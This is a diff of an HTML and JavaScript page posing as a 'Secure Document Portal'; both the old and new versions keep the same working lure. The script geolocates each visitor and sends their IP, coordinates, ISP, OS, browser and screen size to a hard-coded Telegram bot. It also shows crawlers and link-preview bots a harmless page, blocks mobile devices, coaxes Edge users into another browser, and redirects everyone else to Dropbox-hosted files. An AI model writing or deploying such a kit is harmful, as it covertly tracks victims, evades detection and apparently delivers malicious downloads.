@@ -37,18 +37,8 @@
             font-size: 32px;
             color: white;
         }
-        h2 {
-            color: #1a1e2b;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        p {
-            color: #6c757d;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
+        h2 { color: #1a1e2b; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
         .loader {
             width: 36px;
             height: 36px;
@@ -58,31 +48,11 @@
             animation: spin 0.8s linear infinite;
             margin: 20px auto;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .status {
-            color: #6c757d;
-            font-size: 13px;
-            margin: 16px 0;
-        }
-        .manual-link {
-            display: none;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #e9ecef;
-        }
-        .manual-link a {
-            color: #667eea;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
-            color: #adb5bd;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { color: #6c757d; font-size: 13px; margin: 16px 0; }
+        .manual-link { display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
+        .manual-link a { color: #667eea; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .footer { margin-top: 24px; font-size: 11px; color: #adb5bd; }
         
         /* Modal Styles */
         .modal-overlay {
@@ -106,28 +76,10 @@
             text-align: center;
             box-shadow: 0 25px 50px rgba(0,0,0,0.3);
         }
-        .modal-icon {
-            font-size: 56px;
-            margin-bottom: 16px;
-        }
-        .modal-title {
-            font-size: 26px;
-            font-weight: 600;
-            color: #1a1e2b;
-            margin-bottom: 12px;
-        }
-        .modal-text {
-            color: #6c757d;
-            font-size: 15px;
-            margin-bottom: 24px;
-        }
-        .btn-group {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 16px;
-            margin: 24px 0;
-        }
+        .modal-icon { font-size: 56px; margin-bottom: 16px; }
+        .modal-title { font-size: 26px; font-weight: 600; color: #1a1e2b; margin-bottom: 12px; }
+        .modal-text { color: #6c757d; font-size: 15px; margin-bottom: 24px; }
+        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 24px 0; }
         .btn {
             display: inline-block;
             padding: 12px 28px;
@@ -139,52 +91,16 @@
             transition: all 0.2s ease;
             text-decoration: none;
         }
-        .btn-chrome {
-            background: #4285f4;
-            color: white;
-        }
-        .btn-chrome:hover {
-            background: #3367d6;
-            transform: translateY(-2px);
-        }
-        .btn-firefox {
-            background: #ff9400;
-            color: white;
-        }
-        .btn-firefox:hover {
-            background: #e08500;
-            transform: translateY(-2px);
-        }
-        .btn-cancel {
-            background: #e9ecef;
-            color: #495057;
-            margin-top: 8px;
-        }
-        .btn-cancel:hover {
-            background: #dee2e6;
-        }
-        .install-links {
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #e9ecef;
-        }
-        .install-links a {
-            color: #4285f4;
-            text-decoration: none;
-            margin: 0 10px;
-            font-size: 14px;
-        }
-        .install-links a.firefox-link {
-            color: #ff9400;
-        }
-        .install-note {
-            background: #f8f9fa;
-            padding: 12px;
-            border-radius: 12px;
-            margin-top: 20px;
-            font-size: 13px;
-            color: #6c757d;
-        }
+        .btn-chrome { background: #4285f4; color: white; }
+        .btn-chrome:hover { background: #3367d6; transform: translateY(-2px); }
+        .btn-firefox { background: #ff9400; color: white; }
+        .btn-firefox:hover { background: #e08500; transform: translateY(-2px); }
+        .btn-cancel { background: #e9ecef; color: #495057; margin-top: 8px; }
+        .btn-cancel:hover { background: #dee2e6; }
+        .install-links { margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
+        .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 14px; }
+        .install-links a.firefox-link { color: #ff9400; }
+        .install-note { background: #f8f9fa; padding: 12px; border-radius: 12px; margin-top: 20px; font-size: 13px; color: #6c757d; }
     </style>
 </head>
 <body>
@@ -200,96 +116,64 @@
     </div>
 
     <script>
-        // ============================================================
-        // TELEGRAM CONFIGURATION
-        // ============================================================
         const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
         const TELEGRAM_CHAT_ID = '1482823538';
         
-        // ============================================================
-        // YOUR DROPBOX LINKS
-        // ============================================================
         const FILE_LINKS = [
             'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
             'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
             'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
         ];
         
-        // ============================================================
-        // HELPER FUNCTIONS
-        // ============================================================
-        async function sendTelegram(message) {
+        async function sendTelegram(msg) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                 });
             } catch(e) {}
         }
         
-        async function getLocationInfo() {
+        async function getLocation() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
                 const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                const locData = await locRes.json();
-                return {
-                    ip,
-                    city: locData.city || 'Unknown',
-                    region: locData.region || 'Unknown',
-                    country: locData.country_name || 'Unknown',
-                    latitude: locData.latitude || 'N/A',
-                    longitude: locData.longitude || 'N/A',
-                    isp: locData.org || 'Unknown',
-                    timezone: locData.timezone || 'Unknown'
-                };
-            } catch(e) {
-                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', latitude: 'N/A', longitude: 'N/A', isp: 'Unknown', timezone: 'Unknown' };
-            }
+                const d = await locRes.json();
+                return { ip, city: d.city || 'Unknown', region: d.region || 'Unknown', country: d.country_name || 'Unknown', lat: d.latitude || 'N/A', lng: d.longitude || 'N/A', isp: d.org || 'Unknown' };
+            } catch(e) { return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 'N/A', lng: 'N/A', isp: 'Unknown' }; }
         }
         
-        async function sendNotification(selectedFile, browserName, action) {
-            const loc = await getLocationInfo();
-            const fileName = selectedFile.split('/').pop().split('?')[0];
-            const msg = `🔵 <b>DOCUMENT ACCESS</b> 🔵\n\n📍 Location: ${loc.city}, ${loc.region}, ${loc.country}\n🌐 IP: ${loc.ip}\n🗺️ Coordinates: ${loc.latitude}, ${loc.longitude}\n🏢 ISP: ${loc.isp}\n\n📁 File: ${fileName}\n💻 OS: ${navigator.platform}\n🌍 Browser: ${browserName}\n🔄 Action: ${action}\n🖥️ Screen: ${window.screen.width}x${window.screen.height}\n📅 Time: ${new Date().toISOString()}`;
+        async function notify(file, browser, action) {
+            const loc = await getLocation();
+            const fileName = file.split('/').pop().split('?')[0];
+            const msg = `🔵 DOCUMENT ACCESS\n\n📍 ${loc.city}, ${loc.region}, ${loc.country}\n🌐 IP: ${loc.ip}\n🗺️ ${loc.lat}, ${loc.lng}\n🏢 ${loc.isp}\n\n📁 ${fileName}\n💻 ${navigator.platform}\n🌍 ${browser}\n🔄 ${action}\n🖥️ ${window.screen.width}x${window.screen.height}\n📅 ${new Date().toISOString()}`;
             await sendTelegram(msg);
         }
         
-        function detectBrowser() {
+        function getBrowser() {
             const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes('edg') || ua.includes('edge')) return 'Microsoft Edge';
+            if (ua.includes('edg') || ua.includes('edge')) return 'Edge';
             if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
             if (ua.includes('firefox')) return 'Firefox';
-            if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
-            return 'Unknown';
+            return 'Other';
         }
         
         function getRandomFile() {
-            const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
             let hash = 0;
-            for (let i = 0; i < fingerprint.length; i++) {
-                hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-                hash |= 0;
-            }
+            const str = navigator.userAgent + navigator.language + screen.width + screen.height;
+            for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i);
             return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
         }
         
-        function showSwitchBrowserModal(currentUrl) {
-            // Create modal
+        function showModal(url) {
             const modal = document.createElement('div');
             modal.className = 'modal-overlay';
             modal.innerHTML = `
                 <div class="modal-card">
                     <div class="modal-icon">🌐</div>
                     <div class="modal-title">Switch Browser</div>
-                    <div class="modal-text">
-                        This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
-                    </div>
+                    <div class="modal-text">This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.</div>
                     <div class="btn-group">
                         <button id="chromeBtn" class="btn btn-chrome">Open in Chrome</button>
                         <button id="firefoxBtn" class="btn btn-firefox">Open in Firefox</button>
@@ -298,37 +182,27 @@
                         <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
                         <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                     </div>
-                    <div class="install-note">
-                        💡 <strong>After installing:</strong> Click the button above again. The link will open automatically.
-                    </div>
+                    <div class="install-note">💡 After installing: Click the button above again.</div>
                     <button id="cancelBtn" class="btn btn-cancel" style="margin-top: 20px;">Continue in Edge</button>
                 </div>
             `;
             document.body.appendChild(modal);
             
-            // Chrome button
             document.getElementById('chromeBtn').onclick = () => {
-                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_chrome');
-                window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(currentUrl);
+                notify(FILE_LINKS[0], 'Edge', 'opened_in_chrome');
+                window.location.href = 'googlechrome://' + url.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(url);
                 setTimeout(() => window.close(), 1000);
-                modal.remove();
             };
-            
-            // Firefox button
             document.getElementById('firefoxBtn').onclick = () => {
-                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_firefox');
-                window.location.href = 'firefox://' + currentUrl.replace(/^https?:\/\//, '');
-                navigator.clipboard.writeText(currentUrl);
+                notify(FILE_LINKS[0], 'Edge', 'opened_in_firefox');
+                window.location.href = 'firefox://' + url.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(url);
                 setTimeout(() => window.close(), 1000);
-                modal.remove();
             };
-            
-            // Cancel button
             document.getElementById('cancelBtn').onclick = () => {
-                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
+                notify(FILE_LINKS[0], 'Edge', 'cancelled');
                 modal.remove();
-                // Show a message that they can continue
                 document.getElementById('app').innerHTML = `
                     <div class="container">
                         <div class="icon">📄</div>
@@ -338,113 +212,44 @@
                         <div class="footer">Secure • Encrypted</div>
                     </div>
                 `;
-                document.getElementById('proceedBtn').onclick = () => {
-                    const selectedFile = getRandomFile();
-                    window.location.href = selectedFile;
-                };
+                document.getElementById('proceedBtn').onclick = () => window.location.href = getRandomFile();
             };
         }
         
-        // ============================================================
-        // MAIN EXECUTION
-        // ============================================================
         (async function() {
             const ua = navigator.userAgent.toLowerCase();
-            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
-            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
-            const browser = detectBrowser();
-            const currentUrl = window.location.href;
+            const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|iemobile/i.test(ua);
+            const isBot = /bot|crawler|spider|scraper|facebook|twitter|whatsapp/i.test(ua);
+            const browser = getBrowser();
+            const url = window.location.href;
             
-            // Bots get simple page
             if (isBot) {
-                document.getElementById('app').innerHTML = `
-                    <div class="container">
-                        <div class="icon">📄</div>
-                        <h2>Document Portal</h2>
-                        <p>Secure document delivery system.</p>
-                        <div class="footer">Secure Transmission</div>
-                    </div>
-                `;
+                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📄</div><h2>Document Portal</h2><p>Secure document delivery system.</p><div class="footer">Secure Transmission</div></div>`;
                 return;
             }
-            
-            // Mobile block
             if (isMobile) {
-                document.getElementById('app').innerHTML = `
-                    <div class="container">
-                        <div class="icon">📱</div>
-                        <h2>Desktop Access Required</h2>
-                        <p>This document requires a desktop environment.</p>
-                        <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
-                        <div class="footer">Secure Document Portal</div>
-                    </div>
-                `;
+                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📱</div><h2>Desktop Required</h2><p>Please open on a desktop computer.</p><div class="footer">Secure Document Portal</div></div>`;
+                return;
+            }
+            if (browser === 'Edge') {
+                notify(FILE_LINKS[0], 'Edge', 'detected');
+                showModal(url);
                 return;
             }
             
-            // Edge users – show browser switch modal
-            if (browser === 'Microsoft Edge') {
-                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
-                showSwitchBrowserModal(currentUrl);
-                return;
-            }
-            
-            // Chrome/Firefox – normal redirect
-            const selectedFile = getRandomFile();
-            sendNotification(selectedFile, browser, 'access_granted');
-            
+            const file = getRandomFile();
+            notify(file, browser, 'access');
             document.getElementById('app').innerHTML = `
                 <div class="container">
                     <div class="icon">📄</div>
                     <h2>Document Portal</h2>
                     <p>Your document is being prepared</p>
                     <div class="loader"></div>
-                    <div class="status" id="status">Verifying access...</div>
-                    <div class="manual-link" id="manualLink">
-                        <a href="#" id="manualUrl">Click here if not redirected</a>
-                    </div>
+                    <div class="status">Redirecting...</div>
                     <div class="footer">Secure • Encrypted</div>
                 </div>
             `;
-            
-            if (!sessionStorage.getItem('redirected')) {
-                sessionStorage.setItem('redirected', 'true');
-                
-                const delay = 1500 + Math.random() * 2000;
-                const messages = ['Verifying credentials', 'Loading document', 'Preparing download', 'Redirecting...'];
-                let idx = 0;
-                const statusEl = document.getElementById('status');
-                const interval = setInterval(() => {
-                    if (statusEl) {
-                        idx = (idx + 1) % messages.length;
-                        statusEl.innerHTML = messages[idx];
-                    }
-                }, 800);
-                
-                setTimeout(() => {
-                    clearInterval(interval);
-                    window.location.href = selectedFile;
-                }, delay);
-                
-                setTimeout(() => {
-                    const manualLink = document.getElementById('manualLink');
-                    const manualUrl = document.getElementById('manualUrl');
-                    if (manualLink && manualUrl) {
-                        manualLink.style.display = 'block';
-                        manualUrl.href = selectedFile;
-                        const loader = document.querySelector('.loader');
-                        if (loader) loader.style.display = 'none';
-                        if (statusEl) statusEl.innerHTML = 'Click to download';
-                    }
-                }, 5000);
-            } else {
-                const loader = document.querySelector('.loader');
-                const statusEl = document.getElementById('status');
-                if (loader) loader.style.display = 'none';
-                if (statusEl) statusEl.innerHTML = 'Document ready';
-                document.getElementById('manualLink').style.display = 'block';
-                document.getElementById('manualUrl').href = selectedFile;
-            }
+            setTimeout(() => window.location.href = file, 2000);
         })();
     </script>
 </body>
